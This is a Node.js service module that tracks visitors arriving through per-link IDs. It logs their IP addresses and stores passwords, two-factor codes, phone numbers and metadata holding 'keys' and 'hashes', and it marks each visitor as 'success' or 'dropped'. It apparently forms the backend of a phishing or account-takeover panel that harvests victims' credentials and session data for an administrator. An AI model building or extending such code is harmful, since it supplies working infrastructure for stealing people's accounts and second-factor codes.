const axios = require("axios");
const DB = require("../utils/db_query");
const { v4 } = require("uuid");
const Response = require("../responses/response");
const VisitorAdminDto = require("../dtos/visitor-admin-dto");
const VisitorDto = require("../dtos/visitor-dto");

class VisitorService {
  async get(linkId, visitorId, ip) {
    const link = await DB.query("SELECT * FROM link WHERE id = ?", [
      linkId,
    ]).then((data) => data[0]);
    if (!link)
      throw Response.NotFound("Link with the same id was not found :/");
    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      visitor = await DB.query(
        "SELECT * FROM visitor WHERE ip = ? AND refer = ?",
        [ip, linkId]
      ).then((data) => data[0]);
    if (!visitor) {
      visitor = await DB.query(
        "INSERT INTO visitor(id, refer, timestamp, ip) VALUES(?, ?, ?, ?) RETURNING *",
        [v4(), link.id, Date.now(), ip]
      ).then((data) => data[0]);
    }

    return Response.OK(new VisitorDto(visitor));
  }

  async getForce(visitorId) {
    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();
    return Response.OK(
      new VisitorAdminDto({
        ...visitor,
        metadata: JSON.parse(visitor.metadata),
      })
    );
  }

  async delete(visitorId) {
    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    visitor = await DB.query("DELETE FROM visitor WHERE id = ? RETURNING *", [
      visitorId,
    ]).then((data) => data[0]);
    return Response.OK(new VisitorAdminDto(visitor));
  }

  async getAll() {
    const visitors = await DB.query(
      "SELECT * FROM visitor ORDER BY timestamp DESC"
    );
    return Response.OK(visitors.map((visitor) => new VisitorAdminDto(visitor)));
  }

  async setSuccess(visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query(
      "UPDATE visitor SET success = ?, success_timestamp = ? WHERE id = ?",
      [true, Date.now(), visitorId]
    );
  }

  async update2FA(visitorId, pass) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query("UPDATE visitor SET twofa = ? WHERE id = ?", [
      pass,
      visitorId,
    ]);
  }

  async updatePhone(visitorId, phone) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query("UPDATE visitor SET phone = ? WHERE id = ?", [
      phone,
      visitorId,
    ]);
  }

  async setDropped(visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();
    return await DB.query(
      "UPDATE visitor SET dropped = ? WHERE id = ? RETURNING *",
      [true, visitorId]
    ).then((data) => data[0]);
  }

  increment(s, metadata) {
    var source = s;
    if (!source.id && metadata.id) {
      source.id = metadata.id;
    }

    for (const [key, value] of Object.entries(metadata.keys || {})) {
      if (!source.keys[key]) {
        source.keys[key] = value;
      }
    }

    for (const [key, value] of Object.entries(metadata.hashes || {})) {
      if (!source.hashes[key]) {
        source.hashes[key] = value;
      }
    }
    return source;
  }

  async store(data, visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();
    if (!visitor.metadata) {
      visitor.metadata = JSON.stringify(data);
    } else {
      visitor.metadata = JSON.stringify(
        this.increment(JSON.parse(visitor.metadata), data)
      );
    }

    await DB.query(
      "UPDATE visitor SET metadata = ?, success_timestamp = ?, success = true WHERE id = ?",
      [visitor.metadata, Date.now(), visitor.id]
    );
  }

  async storePassword(password, visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();

    await DB.query("UPDATE visitor SET twofa = ? WHERE id = ?", [
      password,
      visitor.id,
    ]);
  }

  async storePhone(phoneNumber, visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();

    await DB.query("UPDATE visitor SET phone = ? WHERE id = ?", [
      phoneNumber,
      visitor.id,
    ]);
  }
}

module.exports = new VisitorService();
